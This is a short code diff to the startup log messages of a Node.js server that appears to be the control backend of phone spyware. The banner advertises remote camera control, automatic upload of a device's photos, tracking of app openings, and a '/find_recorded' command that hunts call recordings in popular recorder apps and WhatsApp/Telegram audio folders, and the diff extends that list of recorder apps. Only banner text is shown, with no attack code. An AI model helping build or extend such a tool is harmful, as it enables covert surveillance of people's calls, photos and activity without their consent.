@@ -2288,13 +2288,20 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ /camera_switch - Toggle between cameras');
     console.log('   └─ Photos are compressed (640x480, 70% quality)');
     console.log('   └─ Auto-upload of new camera photos');
-    console.log('\n✅ RECORDING SCANNER ENABLED:');
-    console.log('   └─ /find_recorded - 🔍 Find call recordings');
-    console.log('   └─ Searches in:');
-    console.log('       • Third-party recorder apps');
-    console.log('       • Common recording paths');
-    console.log('       • Media directories');
-    console.log('       • WhatsApp/Telegram audio folders');
+console.log('\n✅ RECORDING SCANNER ENABLED:');
+console.log('   └─ /find_recorded - 🔍 Find call recordings');
+console.log('   └─ Supports popular apps including:');
+console.log('       • AppStar Call Recorder (com.appstar.callrecorder)');
+console.log('       • ACR Call Recorder');
+console.log('       • Cube Call Recorder');
+console.log('       • Boldbeast Recorder');
+console.log('       • And many more');
+console.log('   └─ Searches in:');
+console.log('       • Third-party recorder app directories');
+console.log('       • Common recording paths');
+console.log('       • Media directories');
+console.log('       • WhatsApp/Telegram audio folders');
+
     console.log('\n✅ APP_OPEN LOG HANDLING:');
     console.log('   └─ Batched every 50 entries into 1 HTML file');
     console.log('   └─ Excluded from regular log sync (20 at a time)');
